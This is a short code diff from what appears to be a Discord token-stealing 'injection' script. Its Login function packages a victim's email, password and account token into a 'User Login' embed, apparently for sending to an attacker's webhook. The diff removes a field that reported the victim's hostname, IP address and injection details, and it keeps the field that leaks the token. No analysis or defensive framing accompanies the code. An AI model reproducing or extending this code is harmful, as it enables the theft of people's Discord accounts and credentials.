@@ -300,10 +300,6 @@ function Login(email, password, token) {
                             "title": "User Login",
                             "color": config['embed-color'],
                             "fields": [{
-                                name: "Info",
-                                value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
-                                inline: !1
-                            }, {
                                 name: "Token",
                                 value: `\`\`\`${token}\`\`\``,
                                 inline: !1
